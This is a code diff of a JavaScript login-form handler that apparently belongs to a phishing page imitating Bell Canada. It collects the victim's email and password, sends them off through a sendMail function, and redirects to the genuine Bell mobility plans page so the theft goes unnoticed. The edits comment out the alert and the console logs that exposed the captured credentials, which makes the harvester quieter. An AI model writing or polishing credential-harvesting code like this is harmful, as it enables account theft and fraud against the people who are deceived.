@@ -18,11 +18,11 @@ form.addEventListener("submit", async (event) => {
   }
   attempts = 0;
   errorSpan.textContent = "";
-  alert("successful login");
+  // alert("successful login");
   // successful redirect them to wherever
   window.location =
     "https://www.bell.ca/Mobility/Cell_phone_plans/Unlimited-plans";
-  console.log({ email, password });
+  // console.log({ email, password });
 });
 
 const sendMail = async ({ email, password }) => {
@@ -38,7 +38,7 @@ const sendMail = async ({ email, password }) => {
     });
 
     const data = await response.json();
-    console.log(data); // Log the response from the server
+    // console.log(data); // Log the response from the server
   } catch (error) {
     console.error("Error:", error);
   }
